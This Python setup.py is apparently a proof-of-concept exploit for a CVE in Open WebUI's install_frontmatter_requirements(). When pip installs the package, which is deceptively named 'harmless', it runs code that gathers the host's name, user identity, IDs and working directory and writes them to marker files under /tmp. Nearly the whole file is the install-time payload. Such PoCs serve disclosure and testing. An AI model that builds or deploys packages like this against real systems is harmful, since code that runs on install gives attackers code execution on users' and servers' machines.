"""
Malicious setup.py for CVE-2026-0765 PoC.

When pip installs this package, setup.py is executed during the build step.
This demonstrates arbitrary code execution via the pip install command injection
in Open WebUI's install_frontmatter_requirements() function.
"""
from setuptools import setup
import os
import socket
import datetime

# === RCE PAYLOAD ===
# Write a marker file proving code execution occurred
marker_file = "/tmp/pwned_cve_2026_0765"

evidence = []
evidence.append(f"CVE-2026-0765 - PoC Exploitation Successful")
evidence.append(f"Timestamp: {datetime.datetime.now().isoformat()}")
evidence.append(f"Hostname: {socket.gethostname()}")
evidence.append(f"UID: {os.getuid()}")
evidence.append(f"GID: {os.getgid()}")
evidence.append(f"CWD: {os.getcwd()}")
evidence.append(f"User: {os.popen('whoami').read().strip()}")
evidence.append(f"ID: {os.popen('id').read().strip()}")
evidence.append(f"Python: {os.popen('python3 --version').read().strip()}")
evidence.append(f"PID: {os.getpid()}")
evidence.append(f"PPID: {os.getppid()}")

with open(marker_file, "w") as f:
    f.write("\n".join(evidence) + "\n")

# Also write to a secondary marker to confirm persistence
with open("/tmp/pwned_rce_confirmed", "w") as f:
    f.write("RCE via pip install command injection in install_frontmatter_requirements()\n")

# === END PAYLOAD ===

setup(
    name="harmless",
    version="1.0",
    packages=["harmless"],
    description="Totally harmless package (CVE-2026-0765 PoC)",
)
